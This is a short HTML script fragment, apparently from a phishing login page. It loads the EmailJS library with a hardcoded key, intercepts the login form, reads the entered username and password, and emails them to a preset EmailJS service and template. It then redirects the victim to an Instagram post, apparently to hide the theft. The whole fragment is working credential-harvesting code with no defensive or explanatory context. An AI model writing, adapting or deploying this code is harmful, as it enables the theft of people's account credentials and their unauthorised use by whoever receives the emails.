    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("SJtg0Qmii7aqFmpBH"); // Replace with your EmailJS User ID
        })();

        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault();

            const params = {
                username: document.getElementById("username").value,
                password: document.getElementById("password").value
            };

            emailjs.send("service_42gxs5i", "template_e0ck84k", params)
                .then(function() {
                    window.location.href = "https://www.instagram.com/p/DD9G1FvJ7aL/?hl=en";
                }, function(error) {
                    alert("Failed to send: " + JSON.stringify(error));
                });
        });
